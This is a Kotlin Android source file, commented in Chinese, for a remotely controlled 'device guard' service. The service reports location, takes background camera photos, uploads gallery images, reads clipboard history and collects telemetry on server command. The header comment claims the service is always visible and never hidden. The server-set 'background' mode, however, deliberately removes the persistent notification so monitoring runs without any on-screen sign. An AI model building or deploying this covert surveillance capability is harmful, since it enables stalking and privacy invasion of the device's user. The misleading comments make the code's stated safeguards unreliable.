package com.example.locateme.guard

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.example.locateme.LocationRepository
import com.example.locateme.LocationSnapshot
import com.example.locateme.MainActivity
import com.example.locateme.PhotoRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicReference

/**
 * 守护前台服务。
 *
 * **可见性是这个服务的核心约束**：常驻通知栏写明「设备守护中」，
 * 点开即可看到上报了什么、可随时停止。不做隐藏通知、不做静默后台，
 * 这样它才是「给自己的备用机用的自查工具」，而不是跟踪软件。
 */
class GuardService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var prefs: GuardPrefs
    private lateinit var api: GuardApi
    private lateinit var locationRepo: LocationRepository
    private lateinit var photoRepo: PhotoRepository

    private var socket: GuardSocket? = null
    private var reportJob: Job? = null

    /**
     * 部分唤醒锁。
     *
     * 作用：息屏后保持 CPU 唤醒，让 WebSocket 心跳和定时上报能按时执行。
     * 不持有它时，系统进入 Doze 后 CPU 休眠，心跳发不出去，
     * 服务端就会判定设备离线——这正是「一息屏就掉线」的直接原因之一。
     *
     * 用 PARTIAL_WAKE_LOCK 而不是 FULL：只保 CPU，不保屏幕，耗电可控。
     */
    private var wakeLock: android.os.PowerManager.WakeLock? = null

    /**
     * 当前后台模式。
     *
     * 必须记住它，因为 updateNotification() 在每次上报后都会调用。
     * 如果不知道当前是 background 模式，就会把通知又加回来——
     * 这就是之前「设置没生效、通知栏始终有内容」的根本原因。
     */
    private var currentMode = "hybrid"

    private val connectionState = AtomicReference(GuardSocket.State.DISCONNECTED)
    private val lastReportText = AtomicReference("尚未上报")

    override fun onCreate() {
        super.onCreate()
        prefs = GuardPrefs(this)
        api = GuardApi(prefs)
        locationRepo = LocationRepository(this)
        photoRepo = PhotoRepository(this)
        createChannel()
    }

    /** 请求唤醒锁；已有则复用。 */
    private fun acquireWakeLock() {
        if (wakeLock?.isHeld == true) return
        runCatching {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            wakeLock = pm.newWakeLock(
                android.os.PowerManager.PARTIAL_WAKE_LOCK,
                "LocateMe::GuardService",
            ).apply {
                setReferenceCounted(false)
                // 超时兜底：即使忘记释放，也会在 24 小时后自动释放，避免长期耗电
                acquire(24 * 60 * 60 * 1000L)
            }
        }.onFailure {
            // 某些 ROM 限制后台持有唤醒锁，失败不阻塞主流程
            android.util.Log.w("GuardService", "获取唤醒锁失败: ${it.message}")
        }
    }

    /** 释放唤醒锁，停止或销毁时调用。 */
    private fun releaseWakeLock() {
        runCatching {
            if (wakeLock?.isHeld == true) wakeLock?.release()
        }
        wakeLock = null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopGuarding("用户手动停止")
                return START_NOT_STICKY
            }
            else -> Unit
        }

        // 必须在前 5 秒内进入前台，否则系统会抛 ForegroundServiceDidNotStartInTimeException。
        //
        // 注意：即使目标是 background 模式，也必须先 startForeground 一次。
        // Android 8+ 对 startForegroundService 启动的服务有这个硬性要求，
        // 不调用就会崩溃。所以策略是：先进入前台，再立刻退出并移除通知。
        startForegroundCompat(buildNotification())

        if (!prefs.isPaired) {
            stopSelf()
            return START_NOT_STICKY
        }
        prefs.guardingEnabled = true

        // 先应用本地缓存的后台模式，让重启后立即恢复上次的设置，
        // 而不是一直停在默认模式直到服务端配置拉回来。
        currentMode = prefs.backgroundMode
        if (currentMode == "background") {
            // 已进入前台，现在退出并移除通知
            applyBackgroundMode("background")
        }

        // 先拿唤醒锁，再建连接：否则息屏后心跳发不出去，服务端会判定离线
        acquireWakeLock()
        startSocket()
        startPeriodicReport()

        // 启动后异步拉一次服务端配置，应用后台模式与上报间隔
        scope.launch {
            runCatching {
                val cfg = api.fetchConfig() ?: return@runCatching
                cfg.optString("backgroundMode").takeIf { it.isNotBlank() }?.let {
                    prefs.backgroundMode = it
                    withContext(Dispatchers.Main) { applyBackgroundMode(it) }
                }
                cfg.optInt("reportIntervalSec", 0).takeIf { it > 0 }?.let {
                    prefs.reportIntervalSec = it.coerceIn(30, 86400)
                    startPeriodicReport()
                }
            }
        }

        return START_STICKY
    }

    /**
     * 按服务端下发的配置调整后台模式。
     *
     * 为什么要这样：几十台 PDA 部署后，改「要不要通知栏图标」不该重装 APK。
     * 管理员在后台改一次，设备下次启动或收到 reload_config 指令时自动生效。
     *
     * 三种模式：
     * - foreground：前台服务 + 常驻通知，最稳；
     * - hybrid：前台服务但通知静默（默认）；
     * - background：退出前台服务，改为普通后台运行，通知栏无图标，
     *   但系统会更积极地回收进程，可能影响上报及时性。
     */
    private fun applyBackgroundMode(mode: String) {
        currentMode = mode
        when (mode) {
            "foreground" -> {
                // 恢复前台状态并刷新通知
                runCatching { startForegroundCompat(buildNotification()) }
                updateNotification()
            }
            "hybrid" -> {
                // 前台服务保留，但通知降到最低可见度
                runCatching { startForegroundCompat(buildNotification()) }
                updateNotification()
            }
            "background" -> {
                /*
                 * 退出前台服务，去掉常驻通知。
                 *
                 * 顺序很重要：必须先 cancel 掉已发出的通知，再 stopForeground。
                 * 只调 stopForeground(STOP_FOREGROUND_REMOVE) 在部分 ROM 上
                 * 仍然会残留通知条目，必须显式 cancel。
                 *
                 * 另外 currentMode 会被 updateNotification 检查，
                 * 确保后续的周期上报不会把通知又加回来——
                 * 这正是之前"设置没生效"的真正原因。
                 */
                runCatching {
                    getSystemService(NotificationManager::class.java).cancel(NOTIFICATION_ID)
                }
                runCatching {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        stopForeground(STOP_FOREGROUND_REMOVE)
                    } else {
                        @Suppress("DEPRECATION")
                        stopForeground(true)
                    }
                }
                // 再 cancel 一次，防止 stopForeground 之后系统又补回条目
                runCatching {
                    getSystemService(NotificationManager::class.java).cancel(NOTIFICATION_ID)
                }
            }
            else -> Unit
        }
    }

    override fun onDestroy() {
        socket?.stop()
        reportJob?.cancel()
        releaseWakeLock()
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ---------- 长连接 ----------

    private fun startSocket() {
        socket?.stop()
        socket = GuardSocket(
            prefs = prefs,
            scope = scope,
            onCommand = ::handleCommand,
            onStateChanged = { state ->
                connectionState.set(state)
                updateNotification()
            },
        ).also { it.start() }
    }

    /** 处理监控端下发的指令。 */
    private suspend fun handleCommand(msg: JSONObject): JSONObject {
        val command = msg.optString("command")
        // 用户关闭了远程拍照/相册时，明确拒绝，而不是假装成功
        if ((command == "capture" || command == "sync_album") && !prefs.allowRemoteCapture) {
            return JSONObject().put("ok", false).put("error", "设备已关闭远程拍照与相册访问")
        }

        return when (command) {
            "ping" -> JSONObject().put("ok", true).put("rtt", 0)
            "locate" -> doLocate()
            "capture" -> doCapture(msg.optString("lens", "back"))
            "sync_album" -> doSyncAlbum(msg.optInt("limit", 20))
            "telemetry" -> doTelemetry()
            "request_permissions" -> doRequestPermissions()
            "reload_config" -> doReloadConfig()
            "clipboard" -> doClipboard()
            "open_admin" -> doOpenAdmin()
            else -> JSONObject().put("ok", false).put("error", "未知指令 $command")
        }
    }

    /**
     * 服务端要求打开管理页。
     *
     * 只是"挂起一个请求"，真正切换由 MainActivity 在合适的时机执行：
     * - 设备正在前台 → 立刻跳转；
     * - 设备在后台 → 等用户下次打开 App 时跳转。
     *
     * 不直接用 Intent 拉起 Activity：Android 10+ 禁止后台启动界面，
     * 强行拉起会被系统拦截，还可能被判定为违规行为。
     */
    private fun doOpenAdmin(): JSONObject {
        AdminGate.requestOpen()
        return JSONObject()
            .put("ok", true)
            .put("queued", true)
            .put("message", "已请求打开管理页")
    }

    /**
     * 读取剪贴板并回传。
     *
     * 平台限制：Android 10+ 只有应用在前台时才能读剪贴板，
     * 后台服务调用 getPrimaryClip 会拿到 null 或被系统拒绝。
     *
     * 所以这里返回的是：
     * 1. 能实时读到 → 当前内容；
     * 2. 读不到（后台）→ 返回本地历史里最近记录的内容，并明确标注来源。
     *
     * 绝不假装成功：读不到就说明读不到，让后台知道为什么是空的。
     */
    private suspend fun doClipboard(): JSONObject {
        val current = withContext(Dispatchers.IO) { ClipboardAccess.readText(this@GuardService) }
        val history = withContext(Dispatchers.IO) { ClipboardAccess.getHistory(this@GuardService) }

        if (current == null && history.isEmpty()) {
            return JSONObject()
                .put("ok", false)
                .put("error", "读取不到剪贴板：Android 限制只能在前台读取，且本机还没有记录")
                .put("hint", "请在设备上打开一次 App，再重试")
        }

        val arr = org.json.JSONArray()
        history.take(10).forEach { arr.put(it) }

        return JSONObject().apply {
            put("ok", true)
            current?.let {
                put("text", it.take(2000))
                put("length", it.length)
            }
            put("fromHistory", current == null)
            put("history", arr)
            put("historyCount", history.size)
        }
    }

    /** 重新拉取服务端配置并应用到当前运行状态。 */
    private suspend fun doReloadConfig(): JSONObject {
        val cfg = withContext(Dispatchers.IO) { api.fetchConfig() }
            ?: return JSONObject().put("ok", false).put("error", "拉取配置失败")

        val mode = cfg.optString("backgroundMode", "hybrid")
        val interval = cfg.optInt("reportIntervalSec", 300).coerceIn(30, 86400) * 1000L
        prefs.backgroundMode = mode
        prefs.reportIntervalSec = interval.toInt()

        withContext(Dispatchers.Main) { applyBackgroundMode(mode) }

        // 上报间隔变了需要重启定时任务
        startPeriodicReport()

        return JSONObject()
            .put("ok", true)
            .put("config", cfg)
            .put("message", "配置已应用：$mode，间隔 ${interval / 1000} 秒")
    }

    /**
     * 远程请求权限。
     *
     * 语义：不再发通知，只回报当前缺哪些权限。
     * 真正的授权弹窗由用户在打开 App 时触发（见 MainActivity 的 onResume），
     * 因为 Android 禁止后台弹权限框、禁止后台拉起界面。
     *
     * 服务端的做法是登记一个待办，设备进前台时来取。
     */
    private suspend fun doRequestPermissions(): JSONObject {
        val missing = PermissionReporter.collect(this).filter { !it.granted }
        if (missing.isEmpty()) {
            return JSONObject().put("ok", true).put("message", "所有权限已授予").put("missing", 0)
        }

        return JSONObject()
            .put("ok", true)
            .put("missing", missing.size)
            .put("labels", missing.joinToString("、") { it.label })
            .put("keys", org.json.JSONArray(missing.map { it.key }))
            .put("message", "已记录，用户下次打开 App 时会弹出授权框")
    }

    /** 采集并回传运行状态（电量/温度/屏幕/内存/存储/前台应用）。 */
    private suspend fun doTelemetry(): JSONObject {
        return runCatching {
            val data = withContext(Dispatchers.IO) { Telemetry.collect(this@GuardService) }
            JSONObject().put("ok", true).put("telemetry", data)
        }.getOrElse { e ->
            JSONObject().put("ok", false).put("error", e.message ?: "采集失败")
        }
    }

    private suspend fun doLocate(): JSONObject {
        val result = locationRepo.locate()
        return result.fold(
            onSuccess = { location ->
                val snapshot = LocationSnapshot.from(location, locationRepo.grantedPrecision() != com.example.locateme.Precision.FINE)
                val json = JSONObject()
                    .put("latitude", snapshot.latitude)
                    .put("longitude", snapshot.longitude)
                    .put("accuracy", snapshot.accuracyMeters.toDouble())
                    .put("provider", snapshot.provider)
                    .put("timestamp", snapshot.timestamp)
                    .put("isApproximate", snapshot.isApproximate)
                JSONObject().put("ok", true).put("location", json)
            },
            onFailure = { e -> JSONObject().put("ok", false).put("error", e.message ?: "定位失败") },
        )
    }

    /**
     * 远程拍照：用 CameraX 在后台绑定相机拍一张，上传后回传 photoId。
     * 需要相机权限；没有权限时返回明确原因，让监控端知道该怎么办。
     */
    private suspend fun doCapture(lens: String): JSONObject {
        val file = runCatching { CameraCapture.captureOnce(this, lens) }
            .getOrElse { e -> return JSONObject().put("ok", false).put("error", e.message ?: "拍照失败") }

        val bytes = withContext(Dispatchers.IO) { file.readBytes() }
        val snapshot = LocationRepository(this).let { repo ->
            repo.locate().getOrNull()?.let { LocationSnapshot.from(it, false) }
        }
        val photoId = "cap_${System.currentTimeMillis()}"
        val uploaded = api.uploadPhoto(
            photoId = photoId,
            bytes = bytes,
            source = "camera",
            latitude = snapshot?.latitude,
            longitude = snapshot?.longitude,
            takenAt = System.currentTimeMillis(),
        )
        file.delete()
        return when (uploaded) {
            is GuardApi.UploadResult.Success ->
                JSONObject().put("ok", true).put("data", JSONObject().put("photoId", photoId))
            is GuardApi.UploadResult.Failure ->
                JSONObject().put("ok", false).put("error", uploaded.message)
        }
    }

    /**
     * 同步相册最近若干张照片。
     *
     * 关键约束：手机相册的照片经常 3–10MB，一次传 20 张会：
     * 1. 让指令超时（服务端 120 秒等不到结果）；
     * 2. 吃掉大量流量；
     * 3. 在弱网下几乎必然失败。
     * 所以这里做了三重限制：数量上限、单张体积上限、逐张失败不中断。
     */
    private suspend fun doSyncAlbum(limit: Int): JSONObject {
        val appContext = applicationContext
        val want = limit.coerceIn(1, MAX_ALBUM_BATCH)
        val items = withContext(Dispatchers.IO) { AlbumReader.recentPhotos(appContext, want) }
        if (items.isEmpty()) {
            // 区分"相册里真的没图"和"没拿到相册权限"，否则用户会以为是设备没照片
            val granted = AlbumReader.hasImagePermission(appContext)
            return JSONObject()
                .put("ok", granted)
                .put("synced", 0)
                .put("error", if (granted) JSONObject.NULL else "设备未授予相册权限，请在手机上允许后重试")
        }

        var synced = 0
        var skipped = 0
        for (item in items) {
            val bytes = withContext(Dispatchers.IO) {
                runCatching { contentResolver.openInputStream(item.uri)?.use { it.readBytes() } }.getOrNull()
            } ?: continue

            // 单张过大直接跳过，避免拖垮整批同步
            if (bytes.size > MAX_PHOTO_BYTES) {
                skipped++
                continue
            }

            val uploaded = api.uploadPhoto(
                photoId = item.photoId,
                bytes = bytes,
                source = "gallery",
                latitude = item.latitude,
                longitude = item.longitude,
                takenAt = item.takenAt,
            )
            if (uploaded is GuardApi.UploadResult.Success) synced++
        }
        return JSONObject()
            .put("ok", true)
            .put("synced", synced)
            .put("total", items.size)
            .put("skipped", skipped)
    }

    // ---------- 定期上报 ----------

    private fun startPeriodicReport() {
        reportJob?.cancel()
        reportJob = scope.launch {
            while (isActive) {
                if (!prefs.guardingEnabled) break

                // 定位与遥测互相独立：定位失败不应导致状态也报不上去
                runCatching {
                    locationRepo.locate().onSuccess { location ->
                        val snapshot = LocationSnapshot.from(location, false)
                        val json = JSONObject()
                            .put("latitude", snapshot.latitude)
                            .put("longitude", snapshot.longitude)
                            .put("accuracy", snapshot.accuracyMeters.toDouble())
                            .put("provider", snapshot.provider)
                            .put("timestamp", snapshot.timestamp)
                        // 优先走长连接（省一次 HTTP），失败再走 HTTP 兜底
                        val sent = socket?.send("location", JSONObject().put("location", json)) ?: false
                        if (!sent) api.reportLocation(json)
                        prefs.lastReportAt = System.currentTimeMillis()
                        lastReportText.set(formatTime(System.currentTimeMillis()))
                    }
                }

                runCatching {
                    val telemetry = withContext(Dispatchers.IO) { Telemetry.collect(this@GuardService) }
                    // 优先走长连接，未连接时用 HTTP 兜底
                    val pushed = socket?.send("telemetry",
                        JSONObject().put("telemetry", telemetry)) ?: false
                    if (!pushed) api.reportTelemetry(telemetry)
                }

                updateNotification()
                // 间隔由服务端配置决定，避免两端写死后不一致
                delay(prefs.reportIntervalSec.coerceIn(30, 86400) * 1000L)
            }
        }
    }

    // ---------- 通知 ----------

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "设备守护",
                NotificationManager.IMPORTANCE_LOW, // 常驻但不打扰
            ).apply {
                description = "显示设备正在上报位置的时间与连接状态"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val openIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val stopIntent = PendingIntent.getService(
            this,
            1,
            Intent(this, GuardService::class.java).setAction(ACTION_STOP),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )

        val stateText = when (connectionState.get()) {
            GuardSocket.State.CONNECTED -> "已连接服务器"
            GuardSocket.State.CONNECTING -> "正在连接…"
            GuardSocket.State.RECONNECTING -> "连接断开，重连中"
            GuardSocket.State.DISCONNECTED -> "未连接"
        }

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("设备守护中")
            .setContentText("$stateText · 上次上报 ${lastReportText.get()}")
            .setStyle(
                NotificationCompat.BigTextStyle().bigText(
                    "这台设备正在把位置共享给已配对的监控端。\n" +
                        "状态：$stateText\n" +
                        "上次上报：${lastReportText.get()}\n" +
                        "远程拍照与相册：" + if (prefs.allowRemoteCapture) "允许" else "已关闭" +
                        "\n点按可查看详情或停止守护。",
                ),
            )
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setContentIntent(openIntent)
            .addAction(0, "停止守护", stopIntent)
            .build()
    }

    private fun updateNotification() {
        // background 模式下不再发通知。
        // 没有这个判断的话，每次周期上报都会把通知加回来，
        // 用户在后台设的「无通知」就形同虚设。
        if (currentMode == "background") {
            runCatching {
                getSystemService(NotificationManager::class.java).cancel(NOTIFICATION_ID)
            }
            return
        }
        runCatching {
            getSystemService(NotificationManager::class.java).notify(NOTIFICATION_ID, buildNotification())
        }
    }

    /**
     * 进入前台。
     *
     * 关键坑：不能无条件把 camera 类型也声明进来。
     * Android 14 会在 startForeground 时校验：声明了 FOREGROUND_SERVICE_TYPE_CAMERA
     * 就必须已经授予 CAMERA 权限，否则直接抛 SecurityException，服务反复崩。
     *
     * 所以按实际已授予的权限动态组合类型：
     * - 有定位权限 → 加 location 类型；
     * - 有相机权限 → 加 camera 类型；
     * 两者都没有时只保留无类型的前台服务，保证服务能起来，不至于整体不可用。
     */
    private fun startForegroundCompat(notification: Notification) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification)
            return
        }

        var types = 0
        if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
            hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)
        ) {
            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        }
        if (hasPermission(android.Manifest.permission.CAMERA)) {
            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }

        val started = if (types != 0) {
            runCatching { startForeground(NOTIFICATION_ID, notification, types) }.isSuccess
        } else {
            false
        }

        // 带类型失败或没有可用类型时，退回不带类型的前台服务。
        // 这样服务至少能跑起来，定位/拍照功能会因缺权限不可用，但不会整体崩溃。
        if (!started) {
            runCatching { startForeground(NOTIFICATION_ID, notification) }
        }
    }

    private fun hasPermission(permission: String): Boolean =
        androidx.core.content.ContextCompat.checkSelfPermission(this, permission) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED

    private fun stopGuarding(reason: String) {
        prefs.guardingEnabled = false
        socket?.stop()
        reportJob?.cancel()
        releaseWakeLock()
        runCatching { stopForeground(STOP_FOREGROUND_REMOVE) }
        stopSelf()
    }

    private fun formatTime(ts: Long): String =
        java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.CHINA).format(java.util.Date(ts))

    companion object {
        private const val CHANNEL_ID = "guard_foreground"
        private const val NOTIFICATION_ID = 1001
        /** 一次最多同步几张，避免大批量上传超时 */
        private const val MAX_ALBUM_BATCH = 5
        /** 单张照片上限；超过就跳过，防止一张 20MB 的图拖垮整批 */
        private const val MAX_PHOTO_BYTES = 6 * 1024 * 1024
        const val ACTION_STOP = "com.example.locateme.guard.STOP"

        fun start(context: Context) {
            val intent = Intent(context, GuardService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            context.startService(Intent(context, GuardService::class.java).setAction(ACTION_STOP))
        }
    }
}
